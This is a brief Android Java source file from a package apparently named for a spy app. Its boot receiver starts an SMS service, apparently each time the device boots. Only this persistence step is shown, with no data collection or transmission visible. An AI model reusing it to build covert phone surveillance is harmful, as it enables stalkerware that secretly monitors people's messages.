package com.spyapp.android.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.spyapp.android.service.SmsService;

public class BootCompleteReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Intent intentService = new Intent(context, SmsService.class);
        context.startService(intentService);
    }

}